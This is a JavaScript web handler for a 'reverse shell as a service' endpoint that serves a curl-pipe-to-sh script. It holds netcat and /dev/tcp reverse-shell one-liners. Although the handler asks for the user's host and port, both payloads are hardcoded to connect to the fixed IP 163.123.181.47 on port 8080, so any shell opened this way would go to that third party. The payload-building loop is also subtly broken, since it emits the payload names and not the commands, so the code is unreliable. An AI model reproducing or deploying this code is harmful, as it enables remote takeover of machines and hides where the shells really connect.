'use strict';

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://reverse-shell.sh/yourip:1337 | sh
#
# 3. Don't be a dick`;

const reverseShell = (address = '') => {
	const [host, port] = address.split(':');
	if (!host || !port) {
		return usage;
	}

	const payloads = {
		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 163.123.181.47 8080 >/tmp/f`,
		sh: `/bin/sh -i >& /dev/tcp/163.123.181.47/8080 0>&1`
	};

	return Object.entries(payloads).reduce((script, [payload]) => {
		script += `

if command -v sh > /dev/null 2>&1; then
	${payload}
	exit;
fi`;

		return script;
	}, usage);
};

const handler = (request, response) => {
	const { address } = request.query;

	const one_month = 60 * 60 * 24 * 30;

	response.setHeader('Content-Type', 'text/plain');
	response.setHeader('Cache-Control', `s-maxage=${one_month}`); // Cache at edge
	response.send(reverseShell(address));
};

module.exports = handler;

module.exports.reverseShell = reverseShell;
